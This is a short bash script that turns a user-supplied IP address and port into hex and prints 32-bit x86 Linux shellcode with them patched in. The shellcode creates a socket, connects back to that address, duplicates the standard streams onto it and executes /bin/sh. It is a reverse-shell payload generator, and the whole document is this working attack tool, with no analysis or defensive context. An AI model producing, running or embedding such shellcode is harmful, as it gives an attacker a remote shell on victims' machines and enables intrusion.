#!/bin/bash

#convert the ip
ad1=`echo $1|cut -d "." -f1`
ad1=`printf "%02X" $ad1`

ad2=`echo $1|cut -d "." -f2`
ad2=`printf "%02X" $ad2`

ad3=`echo $1|cut -d "." -f3`
ad3=`printf "%02X" $ad3`

ad4=`echo $1|cut -d "." -f4`
ad4=`printf "%02X" $ad4`

iphex=`echo "\x$ad1\x$ad2\x$ad3\x$ad4"`

# convert the port
len=`echo "obase=16; $2"|bc | wc -c`
port=""

if [ "$len" == "2" ]
 then
  tmp=`echo "obase=16; $2"|bc`
  port=`echo "\\x0$tmp"`
fi

if [ "$len" == "3" ]
 then
  tmp=`echo "obase=16; $2"|bc`
  port=`echo "\\x$tmp"`
fi

if [ "$len" == "4" ]
 then
  tmp=`echo "obase=16; $2"|bc`
  tmp1=`echo "$tmp"|cut -c1-1`
  tmp2=`echo "$tmp"|cut -c2-3`
  port=`echo "\\x0$tmp1\\x$tmp2"`
fi

if [ "$len" == "5" ]
 then
  tmp=`echo "obase=16; $2"|bc`
  tmp1=`echo "$tmp"|cut -c1-2`
  tmp2=`echo "$tmp"|cut -c3-4`
  port=`echo "\\x$tmp1\\x$tmp2"`
fi

echo "ip as hex: $iphex"
echo "port as hex: $port"

echo "shellcode:"

echo "\"\x6a\x66\x58\x31\xdb\x43\x31\xd2\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\x6a\x66\x58\x43\x68$iphex\x66\x68$port\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\x43\xcd\x80\x89\xc6\x6a\x02\x59\xb0\x3f\xcd\x80\x49\xb0\x3f\xcd\x80\x49\xb0\x3f\xcd\x80\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80\""
